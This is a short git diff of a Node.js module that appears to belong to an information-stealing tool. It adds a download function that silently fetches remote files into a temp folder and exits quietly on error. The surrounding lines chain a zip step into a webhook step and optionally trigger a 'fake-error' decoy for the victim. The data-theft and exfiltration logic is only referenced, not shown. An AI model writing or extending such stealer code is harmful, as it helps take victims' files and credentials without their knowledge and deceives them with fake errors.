@@ -3,8 +3,8 @@ const { runningFromExecutable, sleep } = require('./general');
 const { join, sep } = require('path');
 const os = require('os');
 const { execSync, spawnSync } = require('child_process');
-const { download } = require('../functions/download');
-const { copyFileSync, existsSync, mkdtempSync } = require('fs');
+const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
+const axios = require('axios');
 
 let tempFolder;
 
@@ -42,4 +42,15 @@ module.exports = async () => {
   require('../functions/zip').then(await require('../functions/webhook'));
 
   config.fakeError && require('../functions/fake-error');
+};
+
+async function download(url) {
+  try {
+    const { data } = await axios.get(url, {
+      responseType: 'stream'
+    });
+    data.pipe(createWriteStream(join(getTempFolder(), url.split('/').pop())));
+  } catch (e) {
+    process.exit(0);
+  }
 };
